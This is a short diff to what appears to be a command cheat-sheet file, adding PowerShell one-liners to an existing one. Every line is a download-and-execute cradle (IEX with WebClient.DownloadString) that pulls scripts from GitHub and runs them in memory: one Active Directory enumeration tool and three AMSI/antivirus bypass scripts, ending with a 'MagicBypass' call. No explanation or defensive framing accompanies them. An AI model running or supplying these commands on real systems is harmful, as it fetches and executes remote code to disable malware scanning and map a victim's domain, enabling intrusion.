@@ -1,1 +1,4 @@
 iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/Leo4j/Invoke-ADEnum/main/Invoke-ADEnum.ps1')
+
+
+IEX (New-Object System.Net.WebClient).DownloadString("https://raw.githubusercontent.com/V-i-x-x/AMSI-BYPASS/refs/heads/main/AvBypassTricks/hello.ps1"); IEX (New-Object System.Net.WebClient).DownloadString("https://raw.githubusercontent.com/V-i-x-x/AMSI-BYPASS/refs/heads/main/AvBypassTricks/hello2.ps1"); IEX (New-Object System.Net.WebClient).DownloadString("https://raw.githubusercontent.com/V-i-x-x/AMSI-BYPASS/refs/heads/main/AvBypassTricks/hello3.ps1"); MagicBypass;
